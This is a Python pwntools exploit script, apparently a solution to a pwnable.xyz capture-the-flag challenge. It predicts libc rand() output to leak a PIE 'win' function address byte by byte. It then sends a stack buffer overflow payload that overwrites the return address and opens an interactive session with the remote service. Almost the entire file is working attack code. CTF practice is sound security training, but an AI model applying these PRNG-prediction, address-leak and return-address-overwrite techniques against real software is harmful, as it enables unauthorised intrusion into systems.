from pwn import *
from ctypes import *

# context.log_level = 'debug'
e = ELF('./challenge')
# p = process(e.path, aslr=True)
p = remote('svc.pwnable.xyz', 30040)

lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

def init():
    table = []
    for i in range(0, 0xff):
        lib.srand(i)
        l = []
        for j in range(0x10):
            l.append(lib.rand() & 0xff)
        table.append(l)

    return table

def init_dic():
    dic = {}
    for i in range(0, 0xff):
        dic[i] = 0
    return dic

def findKey(dic):
    for key, val in dic.items():
        if val == 5:
            return key
    return -1

def findAddrByte(iternum, table):
    p.sendlineafter(b'> ', b'1')
    for i in range(iternum):
        p.sendlineafter(b'> ', b'2')
        p.sendlineafter(b': ', b'\x01'*8)
        p.sendlineafter(b'>', b'3')
        p.recvuntil(b': ')

    ciphertexts = []

    p.sendlineafter(b'> ', b'1')
    for i in range(5):
        p.sendlineafter(b'> ', b'2')
        p.sendlineafter(b': ', b'\x01'*8)
        p.sendlineafter(b'>', b'3')
        p.recvuntil(b': ')
        ciphertext = p.recvline().strip()
        # print(ciphertext)
        ciphertexts.append(ciphertext)

    dic = init_dic()

    for i in range(0, len(table)):
        for j in range(len(ciphertexts)):
            if table[i][j] == ciphertexts[j][0]-ord('\x01'):
                dic[i] += 1
    return findKey(dic)

def setSrandZero(table):
    while True:
        ciphertexts = []

        p.sendlineafter(b'> ', b'1')
        for i in range(5):
            p.sendlineafter(b'> ', b'2')
            p.sendlineafter(b': ', b'\x01'*8)
            p.sendlineafter(b'>', b'3')
            p.recvuntil(b': ')
            ciphertext = p.recvline().strip()
            ciphertexts.append(ciphertext)

        flag = False
        for i in range(0, len(table)):
            cnt = 0
            for j in range(len(ciphertexts)):
                if table[0][j] == ciphertexts[j][0]-ord('\x01'):
                    cnt += 1
            if(cnt == len(ciphertexts)):
                flag = True
                break

        if(flag):
            break

table = init()
addr = [0]*6
addr[5] = 0xDA
# addr[5] = 0xD6
# addr[4] = 10

# set srand(0)
# setSrandZero(table)

# 0x000000000011 (win >> 8 * 0))
# addr[5] = findAddrByte(19, table)
# print(addr)

# # set srand(0)
# setSrandZero(table)

# 0x000000001100 (win >> 8 * 1))
addr[4] = findAddrByte(2, table)
print(addr)

# set srand(0)
setSrandZero(table)

# 0x000000110000 (win >> 8 * 2))
addr[3] = findAddrByte(10, table)
print(addr)

# set srand(0)
setSrandZero(table)

# 0x000011000000 (win >> 8 * 3)
addr[2] = findAddrByte(3, table)
print(addr)

# set srand(0)
setSrandZero(table)

# 0x001100000000 (win >> 8 * 4))
addr[1] = findAddrByte(7, table)
print(addr)

# set srand(0)
setSrandZero(table)

# 0x110000000000 (win >> 8 * 5))
addr[0] = findAddrByte(9, table)
print(addr)

win_addr = b''
for ad in addr[::-1]:
    win_addr += p8(ad)

context.log_level = 'debug'

wins = u64(win_addr + p8(0) + p8(0))
print('win leak addr : {}'.format(hex(wins)))

# set srand(0)
setSrandZero(table)

lib.srand(0)
for i in range(5):
    lib.rand()

p.sendlineafter(b'> ', b'2')

pay = b'A'*0x98
for byte in p64(wins):
    pay += p8(byte + 1)

p.sendlineafter(b': ', pay)

p.sendlineafter(b'> ', b'0')

p.interactive()

'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''